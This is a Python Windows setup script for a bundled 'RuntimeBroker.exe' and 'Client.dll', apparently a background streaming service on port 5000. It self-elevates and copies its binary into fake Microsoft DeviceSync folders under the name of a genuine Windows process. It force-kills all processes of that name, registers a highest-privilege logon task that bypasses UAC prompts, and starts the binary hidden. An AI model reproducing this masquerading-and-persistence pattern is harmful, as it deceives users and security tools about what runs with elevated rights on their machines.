import os
import sys
import ctypes
import shutil
import subprocess
import time

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

# Re-launch with Administrator privileges if not elevated
if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

def resource_path(relative_path):
    """ Get absolute path to resource, works for PyInstaller single-exe """
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    base_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_dir, relative_path)

def main():
    service_dir = r"C:\ProgramData\Microsoft\DeviceSync\StreamerService"
    core_dir    = r"C:\ProgramData\Microsoft\DeviceSync\StreamerCore"

    target_exe = os.path.join(service_dir, "RuntimeBroker.exe")
    target_dll = os.path.join(core_dir, "Client.dll")

    CREATE_NO_WINDOW = 0x08000000
    DETACHED_PROCESS = 0x00000008

    # 1. Terminate any currently running instance
    try:
        subprocess.run(["taskkill", "/f", "/im", "RuntimeBroker.exe"], 
                       capture_output=True, creationflags=CREATE_NO_WINDOW)
        time.sleep(0.5)
    except Exception:
        pass

    # 2. Ensure destination folders exist
    os.makedirs(service_dir, exist_ok=True)
    os.makedirs(core_dir, exist_ok=True)

    # 3. Locate and copy RuntimeBroker.exe
    src_exe = resource_path("RuntimeBroker.exe")
    if not os.path.exists(src_exe):
        # Look in dist_nuitka or dist if running unpackaged
        nuitka_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dist_nuitka", "RuntimeBroker.exe")
        dist_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dist", "RuntimeBroker.exe")
        if os.path.exists(nuitka_path):
            src_exe = nuitka_path
        elif os.path.exists(dist_path):
            src_exe = dist_path

    if not os.path.exists(src_exe):
        ctypes.windll.user32.MessageBoxW(0, 
            "Error: RuntimeBroker.exe not found in installer package!\nPlease build RuntimeBroker.exe first.", 
            "Setup Error", 0x10)
        sys.exit(1)

    try:
        shutil.copy2(src_exe, target_exe)
    except Exception as e:
        ctypes.windll.user32.MessageBoxW(0, f"Failed to install files: {e}", "Setup Error", 0x10)
        sys.exit(1)

    # 4. Copy Client.dll if present
    src_dll = resource_path("Client.dll")
    if not os.path.exists(src_dll):
        root_dll = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "Client.dll"))
        if os.path.exists(root_dll):
            src_dll = root_dll

    if os.path.exists(src_dll):
        try:
            shutil.copy2(src_dll, target_dll)
        except Exception:
            pass

    # 5. Create Auto-Start Task in Windows Task Scheduler (Runs elevated at user logon with zero UAC prompts)
    task_name = "RuntimeBrokerSync"
    task_cmd = [
        "schtasks.exe", "/create",
        "/tn", task_name,
        "/tr", f'"{target_exe}" --silent',
        "/sc", "onlogon",
        "/rl", "highest",
        "/f"
    ]
    try:
        subprocess.run(task_cmd, capture_output=True, creationflags=CREATE_NO_WINDOW)
    except Exception as e:
        print(f"Task Scheduler error: {e}")

    # 6. Immediately launch the background service right now (silent mode - no browser, only port 5000 active)
    try:
        subprocess.Popen([target_exe, "--silent"], 
                         creationflags=DETACHED_PROCESS | CREATE_NO_WINDOW,
                         close_fds=True)
    except Exception as e:
        print(f"Failed to launch service: {e}")

    # 7. Success Notification
    ctypes.windll.user32.MessageBoxW(0, 
        "Setup completed successfully!\n\nRuntimeBroker is now running in the background and will automatically start whenever your PC turns on.\n\nYou can access http://localhost:5000 in your browser at any time.",
        "Setup Completed", 0x40)

if __name__ == '__main__':
    main()
